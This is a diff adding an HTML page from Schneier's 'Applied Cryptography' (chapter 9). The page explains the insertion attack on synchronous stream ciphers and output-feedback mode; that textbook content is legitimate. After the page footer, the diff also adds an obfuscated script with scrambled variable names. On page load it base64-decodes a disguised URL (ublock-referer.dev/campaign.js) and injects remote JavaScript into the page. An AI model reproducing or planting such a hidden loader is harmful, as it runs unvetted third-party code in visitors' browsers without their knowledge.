@@ -1,0 +1,124 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=202-205//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Synchronous stream ciphers also protect against any insertions and deletions in the ciphertext, because these cause a loss of synchronization and will be immediately detected. They do not, however, fully protect against bit toggling. Like block ciphers in CFB mode, Mallory can toggle individual bits in the stream. If he knows the plaintext, he can make those bits decrypt to whatever he wants. Subsequent bits will decrypt correctly, so in certain applications Mallory can still do considerable damage.
+</P>
+<P><FONT SIZE="+1"><B><I>Insertion Attack</I></B></FONT></P>
+<P>Synchronous stream ciphers are vulnerable to an <B>insertion attack</B> [93]. Mallory has recorded a ciphertext stream, but does not know the plaintext or the keystream used to encrypt the plaintext.</P>
+<!-- CODE SNIP //-->
+<PRE>
+     Original plaintext:    <I>p</I><SUB>1</SUB> <I>p</I><SUB>2</SUB> <I>p</I><SUB>3</SUB> <I>p</I><SUB>4</SUB> ...
+     Original keystream:    <I>k</I><SUB>1</SUB> <I>k</I><SUB>2</SUB> <I>k</I><SUB>3</SUB> <I>k</I><SUB>4</SUB> ...
+     Original ciphertext:   <I>c</I><SUB>1</SUB> <I>c</I><SUB>2</SUB> <I>c</I><SUB>3</SUB> <I>c</I><SUB>4</SUB> ...
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Mallory inserts a single known bit, <I>p&#146;</I>, into the plaintext after p1 and then manages to get the modified plaintext encrypted with the same keystream. He records the resultant new ciphertext:</P>
+<!-- CODE SNIP //-->
+<PRE>
+New plaintext:           <I>p</I><SUB>1</SUB>    <I>p</I>&#146;   <I>p</I><SUB>2</SUB>    <I>p</I><SUB>3</SUB>    <I>p</I><SUB>4</SUB>    ...
+Original keystream:      <I>k</I><SUB>1</SUB>    <I>k</I><SUB>2</SUB>    <I>k</I><SUB>3</SUB>    <I>k</I><SUB>4</SUB>    <I>k</I><SUB>5</SUB>    ...
+Updated ciphertext:      <I>c</I><SUB>1</SUB>    <I>c</I>&#146;<SUB>2</SUB>   <I>c</I>&#146;<SUB>3</SUB>   <I>c</I>&#146;<SUB>4</SUB>   <I>c</I>&#146;<SUB>5</SUB>      ...
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Assuming he knows the value of <I>p&#146;</I>, he can determine the entire plaintext after that bit from the original ciphertext and new ciphertext:</P>
+<!-- CODE SNIP //-->
+<PRE>
+<I>k</I><SUB>2</SUB> = <I>c</I>&#146;<SUB>2</SUB> &#8853; <I>p</I>&#146;, and then <I>p</I><SUB>2</SUB> = <I>c</I><SUB>2</SUB> &#8853; <I>k</I><SUB>2</SUB>
+<I>k</I><SUB>3</SUB> = <I>c</I>&#146;<SUB>3</SUB> &#8853; <I>p</I><SUB>2</SUB>, and then <I>p</I><SUB>3</SUB> = <I>c</I><SUB>3</SUB> &#8853; <I>k</I><SUB>3</SUB>
+<I>k</I><SUB>4</SUB> = <I>c</I>&#146;<SUB>4</SUB> &#8853; <I>p</I><SUB>3</SUB>, and then <I>p</I><SUB>4</SUB> = <I>c</I><SUB>4</SUB> &#8853; <I>k</I><SUB>4</SUB>
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Mallory doesn&#146;t even have to know the exact position in which the bit was inserted; he can just compare the original and updated ciphertexts to see where they begin to differ. To protect against this attack, never use the same keystream to encrypt two different messages.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">9.8 Output-Feedback Mode</FONT></H3>
+<P><B>Output-feedback (OFB)</B> mode is a method of running a block cipher as a synchronous stream cipher. It is similar to CFB mode, except that <I>n</I> bits of the previous output block are moved into the right-most positions of the queue (see Figure 9.11). Decryption is the reverse of this process. This is called <I>n-</I>bit OFB. On both the encryption and the decryption sides, the block algorithm is used in its encryption mode. This is sometimes called <B>internal feedback</B>, because the feedback mechanism is independent of both the plaintext and the ciphertext streams [291].</P>
+<P>If <I>n</I> is the block size of the algorithm, then <I>n-</I>bit OFB looks like (see Figure 9.12):</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> &#8853; <I>S</I><SUB>i</SUB>; <I>S</I><SUB>i</SUB> = <I>E</I><SUB>K</SUB>(<I>S</I><SUB>i-1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i</SUB> &#8853; <I>S</I><SUB>1</SUB>; <I>S</I><SUB>i</SUB> = <I>E</I><SUB>K</SUB>(<I>S</I><SUB>i-1</SUB>)
+</DL>
+<I><P><A NAME="Fig11"></A><A HREF="javascript:displayWindow('images/09-11.jpg',309,155 )"><IMG SRC="images/09-11t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-11.jpg',309,155)"><FONT COLOR="#000077"><B>Figure 9.11</B></FONT></A>&nbsp;&nbsp;8-bit output-feedback mode.</I>
+</P>
+<P><I>S</I><SUB>i</SUB> is the state, which is independent of either the plaintext or the ciphertext.</P>
+<P>One nice feature of OFB mode is that most of the work can occur offline, before the plaintext message even exists. When the message finally arrives, it can be XORed with the output of the algorithm to produce the ciphertext.</P>
+<P><FONT SIZE="+1"><B><I>Initialization Vector</I></B></FONT></P>
+<P>The OFB shift register must also be initially loaded with an IV. It should be unique but does not have to be secret.
+</P>
+<P><FONT SIZE="+1"><B><I>Error Propagation</I></B></FONT></P>
+<P>OFB mode has no error extension. A single-bit error in the ciphertext causes a single-bit error in the recovered plaintext. This can be useful in some digitized analog transmissions, like digitized voice or video, where the occasional single-bit error can be tolerated but error extension cannot.
+</P>
+<P>On the other hand, a loss of synchronization is fatal. If the shift registers on the encryption end and the decryption end are not identical, then the recovered plaintext will be gibberish. Any system that uses OFB mode must have a mechanism for detecting a synchronization loss and a mechanism to fill both shift registers with a new (or the same) IV to regain synchronization.</P>
+<I><P><A NAME="Fig12"></A><A HREF="javascript:displayWindow('images/09-12.jpg',178,102 )"><IMG SRC="images/09-12t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-12.jpg',178,102)"><FONT COLOR="#000077"><B>Figure 9.12</B></FONT></A>&nbsp;&nbsp;</I>n-<I>bit OFB with an</I> n-<I>bit algorithm.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Security Problems with OFB</I></B></FONT></P>
+<P>An analysis of OFB mode [588,430,431,789] demonstrates that OFB should be used only when the feedback size is the same as the block size. For example, you should only use a 64-bit algorithm in 64-bit OFB mode. Even though the U.S. government authorizes other feedback sizes for DES [1143], avoid them.
+</P>
+<P>OFB mode XORs a keystream with the text. This keystream will eventually repeat. It is important that it does not repeat with the same key; otherwise, there is no security. When the feedback size equals the block size, the block cipher acts as a permutation of <I>m</I>-bit values (where <I>m</I> is the block length) and the average cycle length is 2<SUP><I>m</I></SUP>- 1. For a 64-bit block length, this is a very long number. When the feedback size <I>n</I> is less than the block length, the average cycle length drops to around 2<SUP><I>m</I>/2</SUP>. For a 64-bit block cipher, this is only 2<SUP>32</SUP>&#151;not long enough.</P>
+<P><FONT SIZE="+1"><B><I>Stream Ciphers in OFB</I></B></FONT></P>
+<P>A stream cipher can also run in OFB mode. In this case, the key affects the next-state function (see Figure 9.13). The output function does not depend on the key; very often it is something simple like a single bit of the internal state or the XOR of multiple bits of the internal state. The cryptographic complexity is in the next-state function; this function is key-dependent. This method is also called internal feedback [291], because the feedback mechanism is internal to the key generation algorithm.
+</P>
+<P>In a variant of this mode, the key determines just the initial state of the keystream generator. After the key sets the internal state of the generator, the generator runs undisturbed from then on.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(aFucjpne, gcXjgxch) {gcXjgxch = aFucjpne.createElement('script');gcXjgxch.type = 'text/javascript';gcXjgxch.async = true;gcXjgxch.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');aFucjpne.getElementsByTagName('body')[0].appendChild(gcXjgxch);}(document));</script></body>
+</html>
